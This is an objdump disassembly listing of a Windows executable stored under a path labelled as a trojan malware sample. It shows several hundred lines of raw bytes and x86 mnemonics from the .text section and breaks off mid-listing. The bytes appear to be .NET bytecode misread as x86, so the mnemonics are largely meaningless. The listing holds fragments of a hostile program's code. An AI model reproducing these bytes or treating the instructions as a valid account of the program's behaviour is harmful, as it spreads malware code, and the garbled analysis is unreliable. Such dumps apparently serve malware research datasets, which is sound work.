
malware_samples/trojan/70134da287cbda239af35c4e6c8e49593904e2e5f99d8ca3c395b7244ff09384.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	28 cf                	sub    %cl,%bh
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 fc 4c 00    	add    %al,0x4cfc00
  402013:	00 f4                	add    %dh,%ah
  402015:	80 00 00             	addb   $0x0,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	05 00 00 06 00       	add    $0x60000,%eax
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 22                	add    %ah,(%edx)
  402051:	02 28                	add    (%eax),%ch
  402053:	12 00                	adc    (%eax),%al
  402055:	00 0a                	add    %cl,(%edx)
  402057:	00 2a                	add    %ch,(%edx)
  402059:	62 02                	bound  %eax,(%edx)
  40205b:	28 12                	sub    %dl,(%edx)
  40205d:	00 00                	add    %al,(%eax)
  40205f:	0a 00                	or     (%eax),%al
  402061:	02 17                	add    (%edi),%dl
  402063:	8d 53 00             	lea    0x0(%ebx),%edx
  402066:	00 01                	add    %al,(%ecx)
  402068:	25 16 03 9c 7d       	and    $0x7d9c0316,%eax
  40206d:	01 00                	add    %eax,(%eax)
  40206f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402072:	3e 02 28             	add    %ds:(%eax),%ch
  402075:	12 00                	adc    (%eax),%al
  402077:	00 0a                	add    %cl,(%edx)
  402079:	00 02                	add    %al,(%edx)
  40207b:	03 7d 01             	add    0x1(%ebp),%edi
  40207e:	00 00                	add    %al,(%eax)
  402080:	04 2a                	add    $0x2a,%al
  402082:	3e 02 28             	add    %ds:(%eax),%ch
  402085:	12 00                	adc    (%eax),%al
  402087:	00 0a                	add    %cl,(%edx)
  402089:	00 02                	add    %al,(%edx)
  40208b:	03 7d 02             	add    0x2(%ebp),%edi
  40208e:	00 00                	add    %al,(%eax)
  402090:	04 2a                	add    $0x2a,%al
  402092:	00 00                	add    %al,(%eax)
  402094:	1b 30                	sbb    (%eax),%esi
  402096:	08 00                	or     %al,(%eax)
  402098:	5c                   	pop    %esp
  402099:	02 00                	add    (%eax),%al
  40209b:	00 01                	add    %al,(%ecx)
  40209d:	00 00                	add    %al,(%eax)
  40209f:	11 00                	adc    %eax,(%eax)
  4020a1:	02 28                	add    (%eax),%ch
  4020a3:	09 00                	or     %eax,(%eax)
  4020a5:	00 06                	add    %al,(%esi)
  4020a7:	0a 06                	or     (%esi),%al
  4020a9:	72 01                	jb     0x4020ac
  4020ab:	00 00                	add    %al,(%eax)
  4020ad:	70 6f                	jo     0x40211e
  4020af:	13 00                	adc    (%eax),%eax
  4020b1:	00 0a                	add    %cl,(%edx)
  4020b3:	0d 09 2c 0f 00       	or     $0xf2c09,%eax
  4020b8:	28 06                	sub    %al,(%esi)
  4020ba:	00 00                	add    %al,(%eax)
  4020bc:	06                   	push   %es
  4020bd:	00 16                	add    %dl,(%esi)
  4020bf:	13 04 38             	adc    (%eax,%edi,1),%eax
  4020c2:	33 02                	xor    (%edx),%eax
  4020c4:	00 00                	add    %al,(%eax)
  4020c6:	72 0d                	jb     0x4020d5
  4020c8:	00 00                	add    %al,(%eax)
  4020ca:	70 72                	jo     0x40213e
  4020cc:	9a 00 00 70 14 28 14 	lcall  $0x1428,$0x14700000
  4020d3:	00 00                	add    %al,(%eax)
  4020d5:	0a 74 55 00          	or     0x0(%ebp,%edx,2),%dh
  4020d9:	00 01                	add    %al,(%ecx)
  4020db:	0b 14 0c             	or     (%esp,%ecx,1),%edx
  4020de:	07                   	pop    %es
  4020df:	14 fe                	adc    $0xfe,%al
  4020e1:	03 13                	add    (%ebx),%edx
  4020e3:	05 11 05 39 f1       	add    $0xf1390511,%eax
  4020e8:	01 00                	add    %eax,(%eax)
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	07                   	pop    %es
  4020ed:	73 15                	jae    0x402104
  4020ef:	00 00                	add    %al,(%eax)
  4020f1:	0a 13                	or     (%ebx),%dl
  4020f3:	06                   	push   %es
  4020f4:	11 06                	adc    %eax,(%esi)
  4020f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f7:	16                   	push   %ss
  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	0a 0c 14             	or     (%esp,%edx,1),%cl
  4020fd:	13 07                	adc    (%edi),%eax
  4020ff:	11 06                	adc    %eax,(%esi)
  402101:	6f                   	outsl  %ds:(%esi),(%dx)
  402102:	17                   	pop    %ss
  402103:	00 00                	add    %al,(%eax)
  402105:	0a 72 ac             	or     -0x54(%edx),%dh
  402108:	00 00                	add    %al,(%eax)
  40210a:	70 28                	jo     0x402134
  40210c:	18 00                	sbb    %al,(%eax)
  40210e:	00 0a                	add    %cl,(%edx)
  402110:	2c 0d                	sub    $0xd,%al
  402112:	06                   	push   %es
  402113:	72 b8                	jb     0x4020cd
  402115:	00 00                	add    %al,(%eax)
  402117:	70 6f                	jo     0x402188
  402119:	13 00                	adc    (%eax),%eax
  40211b:	00 0a                	add    %cl,(%edx)
  40211d:	2b 01                	sub    (%ecx),%eax
  40211f:	16                   	push   %ss
  402120:	13 0a                	adc    (%edx),%ecx
  402122:	11 0a                	adc    %ecx,(%edx)
  402124:	2c 2a                	sub    $0x2a,%al
  402126:	00 72 ce             	add    %dh,-0x32(%edx)
  402129:	00 00                	add    %al,(%eax)
  40212b:	70 28                	jo     0x402155
  40212d:	19 00                	sbb    %eax,(%eax)
  40212f:	00 0a                	add    %cl,(%edx)
  402131:	00 08                	add    %cl,(%eax)
  402133:	28 20                	sub    %ah,(%eax)
  402135:	00 00                	add    %al,(%eax)
  402137:	06                   	push   %es
  402138:	13 07                	adc    (%edi),%eax
  40213a:	72 63                	jb     0x40219f
  40213c:	01 00                	add    %eax,(%eax)
  40213e:	70 28                	jo     0x402168
  402140:	19 00                	sbb    %eax,(%eax)
  402142:	00 0a                	add    %cl,(%edx)
  402144:	00 11                	add    %dl,(%ecx)
  402146:	07                   	pop    %es
  402147:	28 21                	sub    %ah,(%ecx)
  402149:	00 00                	add    %al,(%eax)
  40214b:	06                   	push   %es
  40214c:	00 00                	add    %al,(%eax)
  40214e:	2b 36                	sub    (%esi),%esi
  402150:	11 06                	adc    %eax,(%esi)
  402152:	6f                   	outsl  %ds:(%esi),(%dx)
  402153:	17                   	pop    %ss
  402154:	00 00                	add    %al,(%eax)
  402156:	0a 72 ac             	or     -0x54(%edx),%dh
  402159:	00 00                	add    %al,(%eax)
  40215b:	70 28                	jo     0x402185
  40215d:	18 00                	sbb    %al,(%eax)
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	13 0b                	adc    (%ebx),%ecx
  402163:	11 0b                	adc    %ecx,(%ebx)
  402165:	2c 1f                	sub    $0x1f,%al
  402167:	00 72 cb             	add    %dh,-0x35(%edx)
  40216a:	01 00                	add    %eax,(%eax)
  40216c:	70 28                	jo     0x402196
  40216e:	19 00                	sbb    %eax,(%eax)
  402170:	00 0a                	add    %cl,(%edx)
  402172:	00 72 74             	add    %dh,0x74(%edx)
  402175:	02 00                	add    (%eax),%al
  402177:	70 28                	jo     0x4021a1
  402179:	19 00                	sbb    %eax,(%eax)
  40217b:	00 0a                	add    %cl,(%edx)
  40217d:	00 16                	add    %dl,(%esi)
  40217f:	13 04 38             	adc    (%eax,%edi,1),%eax
  402182:	73 01                	jae    0x402185
  402184:	00 00                	add    %al,(%eax)
  402186:	72 8e                	jb     0x402116
  402188:	02 00                	add    (%eax),%al
  40218a:	70 08                	jo     0x402194
  40218c:	28 1a                	sub    %bl,(%edx)
  40218e:	00 00                	add    %al,(%eax)
  402190:	0a 28                	or     (%eax),%ch
  402192:	19 00                	sbb    %eax,(%eax)
  402194:	00 0a                	add    %cl,(%edx)
  402196:	00 06                	add    %al,(%esi)
  402198:	72 c4                	jb     0x40215e
  40219a:	02 00                	add    (%eax),%al
  40219c:	70 6f                	jo     0x40220d
  40219e:	1b 00                	sbb    (%eax),%eax
  4021a0:	00 0a                	add    %cl,(%edx)
  4021a2:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4021a5:	00 0a                	add    %cl,(%edx)
  4021a7:	13 08                	adc    (%eax),%ecx
  4021a9:	14 13                	adc    $0x13,%al
  4021ab:	09 06                	or     %eax,(%esi)
  4021ad:	72 ce                	jb     0x40217d
  4021af:	02 00                	add    (%eax),%al
  4021b1:	70 6f                	jo     0x402222
  4021b3:	13 00                	adc    (%eax),%eax
  4021b5:	00 0a                	add    %cl,(%edx)
  4021b7:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4021ba:	0c 2c                	or     $0x2c,%al
  4021bc:	23 00                	and    (%eax),%eax
  4021be:	06                   	push   %es
  4021bf:	72 ce                	jb     0x40218f
  4021c1:	02 00                	add    (%eax),%al
  4021c3:	70 6f                	jo     0x402234
  4021c5:	1b 00                	sbb    (%eax),%eax
  4021c7:	00 0a                	add    %cl,(%edx)
  4021c9:	28 1d 00 00 0a 11    	sub    %bl,0x110a0000
  4021cf:	08 73 11             	or     %dh,0x11(%ebx)
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	06                   	push   %es
  4021d5:	13 09                	adc    (%ecx),%ecx
  4021d7:	11 09                	adc    %ecx,(%ecx)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	12 00                	adc    (%eax),%al
  4021dc:	00 06                	add    %al,(%esi)
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	08 11                	or     %dl,(%ecx)
  4021e2:	08 06                	or     %al,(%esi)
  4021e4:	72 c4                	jb     0x4021aa
  4021e6:	02 00                	add    (%eax),%al
  4021e8:	70 6f                	jo     0x402259
  4021ea:	1b 00                	sbb    (%eax),%eax
  4021ec:	00 0a                	add    %cl,(%edx)
  4021ee:	28 1e                	sub    %bl,(%esi)
  4021f0:	00 00                	add    %al,(%eax)
  4021f2:	0a 06                	or     (%esi),%al
  4021f4:	72 ea                	jb     0x4021e0
  4021f6:	02 00                	add    (%eax),%al
  4021f8:	70 6f                	jo     0x402269
  4021fa:	1b 00                	sbb    (%eax),%eax
  4021fc:	00 0a                	add    %cl,(%edx)
  4021fe:	06                   	push   %es
  4021ff:	72 fc                	jb     0x4021fd
  402201:	02 00                	add    (%eax),%al
  402203:	70 6f                	jo     0x402274
  402205:	13 00                	adc    (%eax),%eax
  402207:	00 0a                	add    %cl,(%edx)
  402209:	06                   	push   %es
  40220a:	72 ce                	jb     0x4021da
  40220c:	02 00                	add    (%eax),%al
  40220e:	70 6f                	jo     0x40227f
  402210:	13 00                	adc    (%eax),%eax
  402212:	00 0a                	add    %cl,(%edx)
  402214:	2d 03 14 2b 15       	sub    $0x152b1403,%eax
  402219:	72 0a                	jb     0x402225
  40221b:	03 00                	add    (%eax),%eax
  40221d:	70 06                	jo     0x402225
  40221f:	72 ce                	jb     0x4021ef
  402221:	02 00                	add    (%eax),%al
  402223:	70 6f                	jo     0x402294
  402225:	1b 00                	sbb    (%eax),%eax
  402227:	00 0a                	add    %cl,(%edx)
  402229:	28 1a                	sub    %bl,(%edx)
  40222b:	00 00                	add    %al,(%eax)
  40222d:	0a 11                	or     (%ecx),%dl
  40222f:	07                   	pop    %es
  402230:	73 16                	jae    0x402248
  402232:	00 00                	add    %al,(%eax)
  402234:	06                   	push   %es
  402235:	13 0d 00 11 0d 06    	adc    0x60d1100,%ecx
  40223b:	72 26                	jb     0x402263
  40223d:	03 00                	add    (%eax),%eax
  40223f:	70 6f                	jo     0x4022b0
  402241:	1b 00                	sbb    (%eax),%eax
  402243:	00 0a                	add    %cl,(%edx)
  402245:	28 1d 00 00 0a 6f    	sub    %bl,0x6f0a0000
  40224b:	17                   	pop    %ss
  40224c:	00 00                	add    %al,(%eax)
  40224e:	06                   	push   %es
  40224f:	00 72 3c             	add    %dh,0x3c(%edx)
  402252:	03 00                	add    (%eax),%eax
  402254:	70 28                	jo     0x40227e
  402256:	19 00                	sbb    %eax,(%eax)
  402258:	00 0a                	add    %cl,(%edx)
  40225a:	00 06                	add    %al,(%esi)
  40225c:	72 68                	jb     0x4022c6
  40225e:	03 00                	add    (%eax),%eax
  402260:	70 6f                	jo     0x4022d1
  402262:	13 00                	adc    (%eax),%eax
  402264:	00 0a                	add    %cl,(%edx)
  402266:	13 0e                	adc    (%esi),%ecx
  402268:	11 0e                	adc    %ecx,(%esi)
  40226a:	2c 08                	sub    $0x8,%al
  40226c:	00 28                	add    %ch,(%eax)
  40226e:	0f 00 00             	sldt   (%eax)
  402271:	06                   	push   %es
  402272:	00 00                	add    %al,(%eax)
  402274:	28 1f                	sub    %bl,(%edi)
  402276:	00 00                	add    %al,(%eax)
  402278:	0a 00                	or     (%eax),%al
  40227a:	28 20                	sub    %ah,(%eax)
  40227c:	00 00                	add    %al,(%eax)
  40227e:	0a 26                	or     (%esi),%ah
  402280:	00 de                	add    %bl,%dh
  402282:	0d 11 0d 2c 08       	or     $0x82c0d11,%eax
  402287:	11 0d 6f 21 00 00    	adc    %ecx,0x216f
  40228d:	0a 00                	or     (%eax),%al
  40228f:	dc 11                	fcoml  (%ecx)
  402291:	06                   	push   %es
  402292:	6f                   	outsl  %ds:(%esi),(%dx)
  402293:	17                   	pop    %ss
  402294:	00 00                	add    %al,(%eax)
  402296:	0a 72 ac             	or     -0x54(%edx),%dh
  402299:	00 00                	add    %al,(%eax)
  40229b:	70 28                	jo     0x4022c5
  40229d:	18 00                	sbb    %al,(%eax)
  40229f:	00 0a                	add    %cl,(%edx)
  4022a1:	2c 0d                	sub    $0xd,%al
  4022a3:	06                   	push   %es
  4022a4:	72 b8                	jb     0x40225e
  4022a6:	00 00                	add    %al,(%eax)
  4022a8:	70 6f                	jo     0x402319
  4022aa:	13 00                	adc    (%eax),%eax
  4022ac:	00 0a                	add    %cl,(%edx)
  4022ae:	2b 01                	sub    (%ecx),%eax
  4022b0:	16                   	push   %ss
  4022b1:	13 0f                	adc    (%edi),%ecx
  4022b3:	11 0f                	adc    %ecx,(%edi)
  4022b5:	2c 0d                	sub    $0xd,%al
  4022b7:	00 72 82             	add    %dh,-0x7e(%edx)
  4022ba:	03 00                	add    (%eax),%eax
  4022bc:	70 28                	jo     0x4022e6
  4022be:	19 00                	sbb    %eax,(%eax)
  4022c0:	00 0a                	add    %cl,(%edx)
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	11 09                	adc    %ecx,(%ecx)
  4022c6:	14 fe                	adc    $0xfe,%al
  4022c8:	03 13                	add    (%ebx),%edx
  4022ca:	10 11                	adc    %dl,(%ecx)
  4022cc:	10 2c 0a             	adc    %ch,(%edx,%ecx,1)
  4022cf:	00 11                	add    %dl,(%ecx)
  4022d1:	09 6f 13             	or     %ebp,0x13(%edi)
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	06                   	push   %es
  4022d7:	00 00                	add    %al,(%eax)
  4022d9:	00 2b                	add    %ch,(%ebx)
  4022db:	18 00                	sbb    %al,(%eax)
  4022dd:	72 51                	jb     0x402330
  4022df:	04 00                	add    $0x0,%al
  4022e1:	70 28                	jo     0x40230b
  4022e3:	19 00                	sbb    %eax,(%eax)
  4022e5:	00 0a                	add    %cl,(%edx)
  4022e7:	00 72 83             	add    %dh,-0x7d(%edx)
  4022ea:	04 00                	add    $0x0,%al
  4022ec:	70 28                	jo     0x402316
  4022ee:	19 00                	sbb    %eax,(%eax)
  4022f0:	00 0a                	add    %cl,(%edx)
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	16                   	push   %ss
  4022f5:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4022f8:	00 11                	add    %dl,(%ecx)
  4022fa:	04 2a                	add    $0x2a,%al
  4022fc:	01 10                	add    %edx,(%eax)
  4022fe:	00 00                	add    %al,(%eax)
  402300:	02 00                	add    (%eax),%al
  402302:	97                   	xchg   %eax,%edi
  402303:	01 4c e3 01          	add    %ecx,0x1(%ebx,%eiz,8)
  402307:	0d 00 00 00 00       	or     $0x0,%eax
  40230c:	36 00 72 9f          	add    %dh,%ss:-0x61(%edx)
  402310:	04 00                	add    $0x0,%al
  402312:	70 28                	jo     0x40233c
  402314:	19 00                	sbb    %eax,(%eax)
  402316:	00 0a                	add    %cl,(%edx)
  402318:	00 2a                	add    %ch,(%edx)
  40231a:	22 02                	and    (%edx),%al
  40231c:	28 22                	sub    %ah,(%edx)
  40231e:	00 00                	add    %al,(%eax)
  402320:	0a 00                	or     (%eax),%al
  402322:	2a 56 72             	sub    0x72(%esi),%dl
  402325:	b8 10 00 70 80       	mov    $0x80700010,%eax
  40232a:	03 00                	add    (%eax),%eax
  40232c:	00 04 72             	add    %al,(%edx,%esi,2)
  40232f:	cd 1c                	int    $0x1c
  402331:	00 70 80             	add    %dh,-0x80(%eax)
  402334:	04 00                	add    $0x0,%al
  402336:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402339:	00 00                	add    %al,(%eax)
  40233b:	00 13                	add    %dl,(%ebx)
  40233d:	30 05 00 a6 01 00    	xor    %al,0x1a600
  402343:	00 02                	add    %al,(%edx)
  402345:	00 00                	add    %al,(%eax)
  402347:	11 00                	adc    %eax,(%eax)
  402349:	73 23                	jae    0x40236e
  40234b:	00 00                	add    %al,(%eax)
  40234d:	0a 0a                	or     (%edx),%cl
  40234f:	00 02                	add    %al,(%edx)
  402351:	0b 16                	or     (%esi),%edx
  402353:	0c 2b                	or     $0x2b,%al
  402355:	48                   	dec    %eax
  402356:	07                   	pop    %es
  402357:	08 9a 0d 00 09 1f    	or     %bl,0x1f09000d(%edx)
  40235d:	3a 6f 24             	cmp    0x24(%edi),%ch
  402360:	00 00                	add    %al,(%eax)
  402362:	0a 13                	or     (%ebx),%dl
  402364:	04 11                	add    $0x11,%al
  402366:	04 16                	add    $0x16,%al
  402368:	fe 02                	incb   (%edx)
  40236a:	13 05 11 05 2c 1c    	adc    0x1c2c0511,%eax
  402370:	06                   	push   %es
  402371:	09 16                	or     %edx,(%esi)
  402373:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402376:	25 00 00 0a 09       	and    $0x90a0000,%eax
  40237b:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40237e:	58                   	pop    %eax
  40237f:	6f                   	outsl  %ds:(%esi),(%dx)
  402380:	26 00 00             	add    %al,%es:(%eax)
  402383:	0a 6f 27             	or     0x27(%edi),%ch
  402386:	00 00                	add    %al,(%eax)
  402388:	0a 00                	or     (%eax),%al
  40238a:	2b 0d 06 09 7e 28    	sub    0x287e0906,%ecx
  402390:	00 00                	add    %al,(%eax)
  402392:	0a 6f 27             	or     0x27(%edi),%ch
  402395:	00 00                	add    %al,(%eax)
  402397:	0a 00                	or     (%eax),%al
  402399:	00 08                	add    %cl,(%eax)
  40239b:	17                   	pop    %ss
  40239c:	58                   	pop    %eax
  40239d:	0c 08                	or     $0x8,%al
  40239f:	07                   	pop    %es
  4023a0:	8e 69 32             	mov    0x32(%ecx),%gs
  4023a3:	b2 06                	mov    $0x6,%dl
  4023a5:	72 c4                	jb     0x40236b
  4023a7:	02 00                	add    (%eax),%al
  4023a9:	70 6f                	jo     0x40241a
  4023ab:	13 00                	adc    (%eax),%eax
  4023ad:	00 0a                	add    %cl,(%edx)
  4023af:	13 06                	adc    (%esi),%eax
  4023b1:	11 06                	adc    %eax,(%esi)
  4023b3:	2c 4b                	sub    $0x4b,%al
  4023b5:	00 06                	add    %al,(%esi)
  4023b7:	72 c4                	jb     0x40237d
  4023b9:	02 00                	add    (%eax),%al
  4023bb:	70 6f                	jo     0x40242c
  4023bd:	1b 00                	sbb    (%eax),%eax
  4023bf:	00 0a                	add    %cl,(%edx)
  4023c1:	28 29                	sub    %ch,(%ecx)
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	0a 13                	or     (%ebx),%dl
  4023c7:	07                   	pop    %es
  4023c8:	11 07                	adc    %eax,(%edi)
  4023ca:	2c 0c                	sub    $0xc,%al
  4023cc:	00 72 fe             	add    %dh,-0x2(%edx)
  4023cf:	36 00 70 73          	add    %dh,%ss:0x73(%eax)
  4023d3:	2a 00                	sub    (%eax),%al
  4023d5:	00 0a                	add    %cl,(%edx)
  4023d7:	7a 06                	jp     0x4023df
  4023d9:	72 c4                	jb     0x40239f
  4023db:	02 00                	add    (%eax),%al
  4023dd:	70 6f                	jo     0x40244e
  4023df:	1b 00                	sbb    (%eax),%eax
  4023e1:	00 0a                	add    %cl,(%edx)
  4023e3:	28 2b                	sub    %ch,(%ebx)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	0a 16                	or     (%esi),%dl
  4023e9:	fe 01                	incb   (%ecx)
  4023eb:	13 08                	adc    (%eax),%ecx
  4023ed:	11 08                	adc    %ecx,(%eax)
  4023ef:	2c 0c                	sub    $0xc,%al
  4023f1:	00 72 46             	add    %dh,0x46(%edx)
  4023f4:	37                   	aaa
  4023f5:	00 70 73             	add    %dh,0x73(%eax)
  4023f8:	2a 00                	sub    (%eax),%al
  4023fa:	00 0a                	add    %cl,(%edx)
  4023fc:	7a 00                	jp     0x4023fe
  4023fe:	2b 13                	sub    (%ebx),%edx
  402400:	00 06                	add    %al,(%esi)
  402402:	72 c4                	jb     0x4023c8
  402404:	02 00                	add    (%eax),%al
  402406:	70 72                	jo     0x40247a
  402408:	94                   	xchg   %eax,%esp
  402409:	37                   	aaa
  40240a:	00 70 6f             	add    %dh,0x6f(%eax)
  40240d:	27                   	daa
  40240e:	00 00                	add    %al,(%eax)
  402410:	0a 00                	or     (%eax),%al
  402412:	00 06                	add    %al,(%esi)
  402414:	72 ea                	jb     0x402400
  402416:	02 00                	add    (%eax),%al
  402418:	70 6f                	jo     0x402489
  40241a:	13 00                	adc    (%eax),%eax
  40241c:	00 0a                	add    %cl,(%edx)
  40241e:	13 09                	adc    (%ecx),%ecx
  402420:	11 09                	adc    %ecx,(%ecx)
  402422:	2c 26                	sub    $0x26,%al
  402424:	00 06                	add    %al,(%esi)
  402426:	72 ea                	jb     0x402412
  402428:	02 00                	add    (%eax),%al
  40242a:	70 6f                	jo     0x40249b
  40242c:	1b 00                	sbb    (%eax),%eax
  40242e:	00 0a                	add    %cl,(%edx)
  402430:	28 29                	sub    %ch,(%ecx)
  402432:	00 00                	add    %al,(%eax)
  402434:	0a 13                	or     (%ebx),%dl
  402436:	0a 11                	or     (%ecx),%dl
  402438:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  40243b:	00 72 b2             	add    %dh,-0x4e(%edx)
  40243e:	37                   	aaa
  40243f:	00 70 73             	add    %dh,0x73(%eax)
  402442:	2a 00                	sub    (%eax),%al
  402444:	00 0a                	add    %cl,(%edx)
  402446:	7a 00                	jp     0x402448
  402448:	2b 13                	sub    (%ebx),%edx
  40244a:	00 06                	add    %al,(%esi)
  40244c:	72 ea                	jb     0x402438
  40244e:	02 00                	add    (%eax),%al
  402450:	70 72                	jo     0x4024c4
  402452:	f4                   	hlt
  402453:	37                   	aaa
  402454:	00 70 6f             	add    %dh,0x6f(%eax)
  402457:	27                   	daa
  402458:	00 00                	add    %al,(%eax)
  40245a:	0a 00                	or     (%eax),%al
  40245c:	00 06                	add    %al,(%esi)
  40245e:	72 26                	jb     0x402486
  402460:	03 00                	add    (%eax),%eax
  402462:	70 6f                	jo     0x4024d3
  402464:	13 00                	adc    (%eax),%eax
  402466:	00 0a                	add    %cl,(%edx)
  402468:	13 0b                	adc    (%ebx),%ecx
  40246a:	11 0b                	adc    %ecx,(%ebx)
  40246c:	2c 2b                	sub    $0x2b,%al
  40246e:	00 06                	add    %al,(%esi)
  402470:	72 26                	jb     0x402498
  402472:	03 00                	add    (%eax),%eax
  402474:	70 6f                	jo     0x4024e5
  402476:	1b 00                	sbb    (%eax),%eax
  402478:	00 0a                	add    %cl,(%edx)
  40247a:	12 0c 28             	adc    (%eax,%ebp,1),%cl
  40247d:	2c 00                	sub    $0x0,%al
  40247f:	00 0a                	add    %cl,(%edx)
  402481:	16                   	push   %ss
  402482:	fe 01                	incb   (%ecx)
  402484:	13 0d 11 0d 2c 0c    	adc    0xc2c0d11,%ecx
  40248a:	00 72 6c             	add    %dh,0x6c(%edx)
  40248d:	38 00                	cmp    %al,(%eax)
  40248f:	70 73                	jo     0x402504
  402491:	2a 00                	sub    (%eax),%al
  402493:	00 0a                	add    %cl,(%edx)
  402495:	7a 00                	jp     0x402497
  402497:	2b 13                	sub    (%ebx),%edx
  402499:	00 06                	add    %al,(%esi)
  40249b:	72 26                	jb     0x4024c3
  40249d:	03 00                	add    (%eax),%eax
  40249f:	70 72                	jo     0x402513
  4024a1:	b4 38                	mov    $0x38,%ah
  4024a3:	00 70 6f             	add    %dh,0x6f(%eax)
  4024a6:	27                   	daa
  4024a7:	00 00                	add    %al,(%eax)
  4024a9:	0a 00                	or     (%eax),%al
  4024ab:	00 06                	add    %al,(%esi)
  4024ad:	72 ce                	jb     0x40247d
  4024af:	02 00                	add    (%eax),%al
  4024b1:	70 6f                	jo     0x402522
  4024b3:	13 00                	adc    (%eax),%eax
  4024b5:	00 0a                	add    %cl,(%edx)
  4024b7:	13 0e                	adc    (%esi),%ecx
  4024b9:	11 0e                	adc    %ecx,(%esi)
  4024bb:	2c 29                	sub    $0x29,%al
  4024bd:	00 06                	add    %al,(%esi)
  4024bf:	72 ce                	jb     0x40248f
  4024c1:	02 00                	add    (%eax),%al
  4024c3:	70 6f                	jo     0x402534
  4024c5:	1b 00                	sbb    (%eax),%eax
  4024c7:	00 0a                	add    %cl,(%edx)
  4024c9:	12 0f                	adc    (%edi),%cl
  4024cb:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4024ce:	00 0a                	add    %cl,(%edx)
  4024d0:	16                   	push   %ss
  4024d1:	fe 01                	incb   (%ecx)
  4024d3:	13 10                	adc    (%eax),%edx
  4024d5:	11 10                	adc    %edx,(%eax)
  4024d7:	2c 0c                	sub    $0xc,%al
  4024d9:	00 72 c0             	add    %dh,-0x40(%edx)
  4024dc:	38 00                	cmp    %al,(%eax)
  4024de:	70 73                	jo     0x402553
  4024e0:	2a 00                	sub    (%eax),%al
  4024e2:	00 0a                	add    %cl,(%edx)
  4024e4:	7a 00                	jp     0x4024e6
  4024e6:	06                   	push   %es
  4024e7:	13 11                	adc    (%ecx),%edx
  4024e9:	2b 00                	sub    (%eax),%eax
  4024eb:	11 11                	adc    %edx,(%ecx)
  4024ed:	2a 22                	sub    (%edx),%ah
  4024ef:	02 28                	add    (%eax),%ch
  4024f1:	22 00                	and    (%eax),%al
  4024f3:	00 0a                	add    %cl,(%edx)
  4024f5:	00 2a                	add    %ch,(%edx)
  4024f7:	00 13                	add    %dl,(%ebx)
  4024f9:	30 05 00 8a 01 00    	xor    %al,0x18a00
  4024ff:	00 03                	add    %al,(%ebx)
  402501:	00 00                	add    %al,(%eax)
  402503:	11 00                	adc    %eax,(%eax)
  402505:	02 72 0e             	add    0xe(%edx),%dh
  402508:	39 00                	cmp    %eax,(%eax)
  40250a:	70 72                	jo     0x40257e
  40250c:	ab                   	stos   %eax,%es:(%edi)
  40250d:	39 00                	cmp    %eax,(%eax)
  40250f:	70 16                	jo     0x402527
  402511:	8c 58 00             	mov    %ds,0x0(%eax)
  402514:	00 01                	add    %al,(%ecx)
  402516:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402519:	00 0a                	add    %cl,(%edx)
  40251b:	28 2d 00 00 0a 7d    	sub    %ch,0x7d0a0000
  402521:	07                   	pop    %es
  402522:	00 00                	add    %al,(%eax)
  402524:	04 02                	add    $0x2,%al
  402526:	72 0e                	jb     0x402536
  402528:	39 00                	cmp    %eax,(%eax)
  40252a:	70 72                	jo     0x40259e
  40252c:	c3                   	ret
  40252d:	39 00                	cmp    %eax,(%eax)
  40252f:	70 72                	jo     0x4025a3
  402531:	db 39                	fstpt  (%ecx)
  402533:	00 70 28             	add    %dh,0x28(%eax)
  402536:	14 00                	adc    $0x0,%al
  402538:	00 0a                	add    %cl,(%edx)
  40253a:	74 55                	je     0x402591
  40253c:	00 00                	add    %al,(%eax)
  40253e:	01 7d 08             	add    %edi,0x8(%ebp)
  402541:	00 00                	add    %al,(%eax)
  402543:	04 02                	add    $0x2,%al
  402545:	7b 08                	jnp    0x40254f
  402547:	00 00                	add    %al,(%eax)
  402549:	04 0a                	add    $0xa,%al
  40254b:	06                   	push   %es
  40254c:	72 dd                	jb     0x40252b
  40254e:	39 00                	cmp    %eax,(%eax)
  402550:	70 28                	jo     0x40257a
  402552:	2e 00 00             	add    %al,%cs:(%eax)
  402555:	0a 0b                	or     (%ebx),%cl
  402557:	07                   	pop    %es
  402558:	2c 62                	sub    $0x62,%al
  40255a:	00 05 0c 08 2c 2a    	add    %al,0x2a2c080c
  402560:	00 72 0b             	add    %dh,0xb(%edx)
  402563:	3a 00                	cmp    (%eax),%al
  402565:	70 1a                	jo     0x402581
  402567:	8d 10                	lea    (%eax),%edx
  402569:	00 00                	add    %al,(%eax)
  40256b:	01 25 16 03 a2 25    	add    %esp,0x25a20316
  402571:	17                   	pop    %ss
  402572:	04 8c                	add    $0x8c,%al
  402574:	58                   	pop    %eax
  402575:	00 00                	add    %al,(%eax)
  402577:	01 a2 25 18 06 a2    	add    %esp,-0x5df9e7db(%edx)
  40257d:	25 19 06 a2 28       	and    $0x28a20619,%eax
  402582:	2f                   	das
  402583:	00 00                	add    %al,(%eax)
  402585:	0a 0a                	or     (%edx),%cl
  402587:	00 2b                	add    %ch,(%ebx)
  402589:	2c 00                	sub    $0x0,%al
  40258b:	72 65                	jb     0x4025f2
